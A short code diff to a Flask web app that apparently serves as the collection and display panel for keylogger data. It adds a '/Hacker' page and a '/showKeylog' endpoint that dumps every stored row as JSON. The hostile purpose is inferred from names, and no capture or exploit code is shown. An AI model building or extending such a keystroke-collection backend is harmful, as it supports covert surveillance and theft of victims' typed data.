@@ -17,6 +17,10 @@ def load_cfg(path):
         print("Exception: ", e)
     return jsonres
     
+def datetime_convertor(o):
+  if isinstance(o,datetime.datetime):
+      return o.__str__()
+    
 @app.route('/')
 def hello():
     return render_template('index.html')
@@ -60,8 +64,12 @@ def pushDB(payload):
   db.commit()
   return 0 
 
-@app.route('/showKeylog', methods=['GET'])
+@app.route('/Hacker', methods=['GET'])
 def showKeylog():
+  return render_template('base.html')
+
+@app.route('/showKeylog', methods=['GET'])
+def pushKeylog():
   main_cfg = load_cfg('./main_cfg.json')
   res = {}
 
@@ -77,11 +85,10 @@ def showKeylog():
   
   sql = f"SELECT * FROM {main_cfg['dbTable']}"
   mycursor.execute(sql)
-  rows = mycursor.fetchall()
   
-  for row in rows:
-    res[row["id"]] = make_response(jsonify(row))
-  
+  res = json.dumps(mycursor.fetchall(), default=datetime_convertor)
+  print(res)
+
   return res
   
   
